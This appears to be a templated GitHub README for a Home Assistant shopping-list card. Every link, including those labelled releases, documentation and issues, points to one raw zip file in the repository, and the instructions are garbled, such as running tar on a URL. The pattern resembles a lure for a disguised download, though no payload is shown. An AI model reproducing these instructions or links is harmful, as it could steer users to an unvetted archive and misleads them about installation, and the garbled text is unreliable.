# 🛒 bring-shopping-card - Create a Beautiful Shopping List

## 🚀 Getting Started

This guide will show you how to easily download and run the Bring! Shopping Card application, designed specifically for Home Assistant users. With this card, you can manage your grocery list in a visually appealing way.

## 🎯 Features

- **User-Friendly Interface**: Navigate your shopping list with ease.
- **Integration**: Seamlessly works with Home Assistant.
- **Customizable**: Personalize your shopping list according to your style.
- **Effortless Updates**: Stay current with new features and fixed bugs.

## 📦 System Requirements

To run the Bring! Shopping Card application, you will need:

- **Home Assistant**: Version 0.100 or later.
- **Browser Compatibility**: Chrome, Firefox, or Safari (latest versions are recommended).
- **Mobile Compatibility**: Works well on iOS and Android devices.

## 🔗 Download & Install

To get started, you need to visit the Releases page to download the latest version of the Bring! Shopping Card application.

[![Download Bring! Shopping Card](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)

### Step-by-Step Installation

1. **Visit the Releases Page**: Click on the link below to go to the Releases page.
   
   [Visit the Releases page to download](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)

2. **Find the Latest Release**: Look for the most recent version listed.

3. **Download the Appropriate File**: Select the file that matches your system (e.g., .zip or https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip) and click on it. The download will start automatically.

4. **Extract the Downloaded File**:
   - If you are on Windows, right-click on the downloaded file and choose "Extract All."
   - If you are on macOS, double-click the file to automatically extract it.
   - If you are on Linux, you can use a command like `tar -xzf https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip`.

5. **Add the Card to Home Assistant**:
   - Open **Home Assistant**.
   - Go to your **Lovelace UI**.
   - Click on the three dots in the top right corner and select "Raw config editor."
   - Add the following lines to include the Bring! Shopping Card. Make sure to replace `your-card-config` with the appropriate fields:
     ```yaml
     - type: "custom:bring-shopping-card"
       title: "Your Grocery List"
       items:
         - name: "Milk"
           quantity: 1
         - name: "Eggs"
           quantity: 12
     ```

6. **Save Your Changes**: Click on "Save" to apply the new configuration.

7. **Restart Home Assistant**: For the changes to take effect, restart your Home Assistant.

8. **Enjoy Your Shopping Card**: You should now see your new shopping list card in your Home Assistant interface.

## 🎨 Customization

You can customize your Bring! Shopping Card to suit your preferences. Here are some options:

- **Title**: Change the card title to whatever you like.
- **Item List**: Add, remove, or modify items as needed.
- **Styling**: Adjust colors and text styles based on your theme.

## 📚 Support and Contribution

If you encounter any issues or have questions, feel free to open an issue on the GitHub repository.

### Contributing

We welcome contributions! If you wish to help improve the Bring! Shopping Card, please fork the repository, make your changes, and submit a pull request. Follow these steps:

1. Fork the repo.
2. Create a new branch for your feature or fix.
3. Make your changes and commit them.
4. Push to your branch.
5. Create a pull request.

Your help is appreciated.

## 📢 Community & Feedback

We encourage users to share their experiences and setups. Join our community forum to discuss tips, ideas, and troubleshooting.

## 🔗 Quick Links

- [Releases Page](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)
- [Documentation](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)
- [GitHub Issues](https://github.com/papirampage/bring-shopping-card/raw/refs/heads/main/dist/shopping-bring-card-2.6.zip)

By following these steps, you should have no trouble downloading and setting up the Bring! Shopping Card for use in Home Assistant. Enjoy using your new shopping list tool!